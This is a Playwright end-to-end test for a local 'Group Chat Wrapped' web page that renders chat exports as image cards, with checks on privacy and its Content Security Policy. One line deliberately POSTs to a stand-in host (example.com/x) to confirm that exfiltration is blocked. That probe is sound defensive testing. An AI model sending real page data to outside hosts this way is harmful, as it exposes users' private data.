// Playwright end-to-end test for docs/wrapped/ (Group Chat Wrapped).
// Run: NODE_PATH=/opt/npm-tools/node_modules node bots/wrapped/test_page.js <screenshot dir>
// Uses only synthetic fixtures. Kit is routed to a local stub; the real API is never hit.
const { chromium } = require('playwright');
const JSZip = require(require('path').resolve(__dirname, '../../docs/wrapped/vendor/jszip-3.10.1.min.js'));
const http = require('http'), fs = require('fs'), path = require('path'), crypto = require('crypto');

const ROOT = path.resolve(__dirname, '../../docs');
const FX = path.join(__dirname, 'fixtures');
const OUT = path.resolve(process.argv[2] || '.');
fs.mkdirSync(OUT, { recursive: true });
const PORT = 8767, ORIGIN = 'http://127.0.0.1:' + PORT;
const TYPES = { '.html': 'text/html', '.js': 'application/javascript', '.json': 'application/json', '.png': 'image/png', '.css': 'text/css', '.md': 'text/plain' };
const server = http.createServer((req, res) => {
  let p = decodeURIComponent(req.url.split('?')[0]); if (p.endsWith('/')) p += 'index.html';
  fs.readFile(path.join(ROOT, p), (e, b) => {
    if (e) { res.writeHead(404); res.end(); return; }
    res.writeHead(200, { 'Content-Type': TYPES[path.extname(p)] || 'application/octet-stream' }); res.end(b);
  });
}).listen(PORT);

let fails = 0;
const check = (c, m) => { console.log((c ? '  ok   ' : '  FAIL ') + m); if (!c) fails++; };

async function cardInfo(page) {
  return page.evaluate(() => [...document.querySelectorAll('#deck canvas')].map((c) => {
    const ctx = c.getContext('2d');
    const d = ctx.getImageData(0, 0, c.width, c.height).data;
    let min = 255, max = 0, sum = 0;
    for (let i = 0; i < d.length; i += 4 * 997) { const v = d[i] + d[i + 1] + d[i + 2]; min = Math.min(min, v); max = Math.max(max, v); sum = (sum * 31 + v) >>> 0; }
    return { w: c.width, h: c.height, spread: max - min, hash: sum, label: c.getAttribute('aria-label') };
  }));
}

async function upload(page, file) {
  await page.evaluate(() => { document.querySelector('#deck').innerHTML = ''; });
  await page.setInputFiles('#file', path.join(FX, file));
  await page.waitForFunction(() => document.querySelectorAll('#deck canvas').length > 0, null, { timeout: 30000 });
  return cardInfo(page);
}

(async () => {
  const browser = await chromium.launch();
  for (const width of [390, 1280]) {
    console.log(`\n== ${width}px ==`);
    const ctx = await browser.newContext({ viewport: { width, height: 900 }, acceptDownloads: true });
    const page = await ctx.newPage();
    const errs = []; page.on('pageerror', (e) => errs.push(String(e))); page.on('console', (m) => { if (m.type() === 'error') errs.push(m.text()); });

    // Intercept every request. Anything that isn't a same-origin static GET is recorded and aborted.
    const all = [], offOrigin = [];
    await ctx.route('**/*', (route) => {
      const r = route.request();
      all.push({ url: r.url(), method: r.method() });
      if (!r.url().startsWith(ORIGIN + '/')) { offOrigin.push(r.url()); return route.abort(); }
      return route.continue();
    });

    await page.goto(ORIGIN + '/wrapped/');
    await page.waitForLoadState('networkidle');
    check(offOrigin.length === 0, `page load makes no off-origin requests (${offOrigin.join(', ') || 'none'})`);
    check(/Your chat never leaves your device\./.test(await page.textContent('#privacy-badge')), 'privacy promise visible');
    check(await page.locator('a[href="https://github.com/lanternlab2027/lab/tree/main/docs/wrapped"]').count() >= 1, 'GitHub folder link present');
    check(await page.isDisabled('#unlock') && /Coming soon/.test(await page.textContent('#unlock')), 'paid unlock is a disabled "coming soon" stub');
    const csp = await page.getAttribute('meta[http-equiv="Content-Security-Policy"]', 'content');
    check(/connect-src https:\/\/api\.convertkit\.com;/.test(csp) && /script-src 'self'/.test(csp), 'CSP restricts scripts to self and connections to Kit only');
    const loadCount = all.length;

    // WhatsApp .txt
    let cards = await upload(page, 'WhatsApp Chat with Weekend Crew.txt');
    check(cards.length >= 8 && cards.length <= 12, `WhatsApp .txt -> ${cards.length} cards`);
    check(cards.every((c) => c.w === 1080 && c.h === 1920), 'every card is 1080x1920');
    check(cards.every((c) => c.spread > 200), 'every card has rendered content (not blank)');
    const before = cards[1].hash;
    await page.check('input[name="names"][value="initials"]');
    const afterInit = await cardInfo(page);
    check(afterInit[1].hash !== before, 'hide-names (initials) re-renders cards');
    await page.check('input[name="names"][value="first"]');
    const afterFirst = await cardInfo(page);
    check(afterFirst[1].hash !== before && afterFirst[1].hash !== afterInit[1].hash, 'first-names-only re-renders cards');
    await page.check('input[name="names"][value="full"]');
    check(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), 'no horizontal page scroll');
    await page.screenshot({ path: path.join(OUT, `page-${width}-whatsapp.png`), fullPage: width === 1280 });
    if (width === 390) {
      await page.locator('#deck').screenshot({ path: path.join(OUT, `deck-${width}.png`) });
    }

    // Save one PNG and the zip.
    const [dl1] = await Promise.all([page.waitForEvent('download'), page.click('#deck figure:first-child button:has-text("Save PNG")')]);
    const p1 = await dl1.path();
    check(/\.png$/.test(dl1.suggestedFilename()) && fs.statSync(p1).size > 50000, `Save PNG -> ${dl1.suggestedFilename()} (${fs.statSync(p1).size} bytes)`);
    const [dlz] = await Promise.all([page.waitForEvent('download'), page.click('#zip-all')]);
    const z = await JSZip.loadAsync(fs.readFileSync(await dlz.path()));
    check(Object.keys(z.files).length === cards.length, `zip has ${Object.keys(z.files).length} PNGs`);

    // WhatsApp .zip (iOS style: _chat.txt inside)
    cards = await upload(page, 'WhatsApp Chat - Weekend Crew.zip');
    check(cards.length >= 8, `WhatsApp .zip -> ${cards.length} cards`);
    check((await page.inputValue('#title-input')) === 'Weekend Crew', 'group name taken from zip filename');

    // Telegram result.json
    cards = await upload(page, 'result.json');
    check(cards.length >= 8 && cards.every((c) => c.spread > 200), `Telegram result.json -> ${cards.length} cards`);
    await page.screenshot({ path: path.join(OUT, `page-${width}-telegram.png`) });

    // A small fixture (fewer cards, still renders) and a bad file.
    cards = await upload(page, 'telegram_result.json');
    check(cards.length >= 4, `tiny Telegram export -> ${cards.length} cards`);
    await page.setInputFiles('#file', path.join(FX, '..', 'make_fixtures.py'));
    await page.waitForFunction(() => document.querySelector('#status').classList.contains('err'));
    check(true, 'non-chat file shows an error');

    // The core privacy assertion: after load, uploads made zero requests except same-origin static GETs.
    const afterUpload = all.slice(loadCount);
    const bad = afterUpload.filter((r) => !(r.method === 'GET' && r.url.startsWith(ORIGIN + '/')));
    check(bad.length === 0 && offOrigin.length === 0, `no network requests carrying chat data after upload (${afterUpload.length} total after load, ${bad.length} non-static)`);

    // CSP really blocks an exfiltration attempt from page context.
    const blocked = await page.evaluate(() => fetch('https://example.com/x', { method: 'POST', body: 'test' }).then(() => false, () => true));
    check(blocked, 'CSP blocks fetch to a third-party origin');

    // Kit signup sends only the email (chat is still loaded on the page).
    const kit = [];
    await page.unroute('**/*');
    await page.route(/convertkit\.com|kit\.com/, async (route) => {
      kit.push({ url: route.request().url(), body: route.request().postData() || '' });
      await route.fulfill({ status: 200, contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': '*' }, body: '{"subscription":{"id":1}}' });
    });
    await page.setInputFiles('#file', path.join(FX, 'WhatsApp Chat with Weekend Crew.txt'));
    await page.waitForFunction(() => document.querySelectorAll('#deck canvas').length > 0);
    await page.fill('#signup-email', 'test@example.com');
    await page.click('#signup-form button');
    await page.waitForFunction(() => /You're in|didn't go through/.test(document.querySelector('#notify').textContent));
    const body = kit[0] ? JSON.parse(kit[0].body) : {};
    check(kit.length === 1 && /25875149/.test(kit[0].url), 'Kit called once with 25875149');
    check(JSON.stringify(Object.keys(body).sort()) === '["api_key","email"]' && !/Maya|Weekend|tacos/.test(kit[0].body), 'Kit body has only api_key + email (no chat data)');

    // Sample button.
    await page.click('#reset');
    await page.click('#sample');
    await page.waitForFunction(() => document.querySelectorAll('#deck canvas').length >= 8);
    check(true, 'sample chat renders');
    const realErrs = errs.filter((e) => !/example\.com\/x/.test(e)); // the deliberate CSP probe above
    check(realErrs.length === 0, `no page errors (${realErrs.join(' | ') || 'none'})`);
    await ctx.close();
  }

  // Export a few cards as PNGs for visual review.
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  await page.goto(ORIGIN + '/wrapped/');
  await upload(page, 'result.json');
  const urls = await page.evaluate(() => [...document.querySelectorAll('#deck canvas')].map((c) => c.toDataURL('image/png')));
  urls.forEach((u, i) => fs.writeFileSync(path.join(OUT, `card-telegram-${String(i + 1).padStart(2, '0')}.png`), Buffer.from(u.split(',')[1], 'base64')));
  await page.check('input[name="names"][value="initials"]');
  const u2 = await page.evaluate(() => document.querySelectorAll('#deck canvas')[1].toDataURL('image/png'));
  fs.writeFileSync(path.join(OUT, 'card-initials-yapper.png'), Buffer.from(u2.split(',')[1], 'base64'));
  await browser.close(); server.close();
  console.log(fails ? `\n${fails} FAILED` : '\nALL PASSED');
  process.exit(fails ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
